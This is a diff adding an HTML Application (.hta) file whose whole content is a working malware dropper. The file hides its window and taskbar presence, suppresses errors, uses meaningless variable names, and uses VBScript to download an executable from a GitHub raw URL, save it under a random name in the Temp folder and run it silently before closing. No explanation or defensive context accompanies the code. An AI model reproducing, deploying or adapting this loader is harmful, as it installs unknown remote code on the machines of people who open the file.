@@ -1,0 +1,41 @@
+<html>
+<head>
+<HTA:APPLICATION 
+    WINDOWSTATE="minimize"
+    SHOWINTASKBAR="no"
+    NAVIGABLE="no"
+    SCROLL="no"
+    BORDER="none"
+    CAPTION="no"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="no">
+</head>
+<body>
+<script language="VBScript">
+On Error Resume Next
+
+Dim xjtecaoo, dgmhxanl, eideswci, atdvtrgy
+Set xjtecaoo = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+Set dgmhxanl = CreateObject("ADODB.Stream")
+Set eideswci = CreateObject("WScript.Shell")
+
+xjtecaoo.Open "GET", "https://github.com/hubgit505/extract/raw/refs/heads/main/main.exe", False
+xjtecaoo.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+xjtecaoo.Send
+
+If xjtecaoo.Status = 200 Then
+    dgmhxanl.Open
+    dgmhxanl.Type = 1
+    dgmhxanl.Write xjtecaoo.ResponseBody
+    
+    atdvtrgy = eideswci.ExpandEnvironmentStrings("%TEMP%") & "\wfimgzad.exe"
+    dgmhxanl.SaveToFile atdvtrgy, 2
+    dgmhxanl.Close
+    
+    eideswci.Run atdvtrgy, 0, False
+End If
+
+window.close()
+</script>
+</body>
+</html>
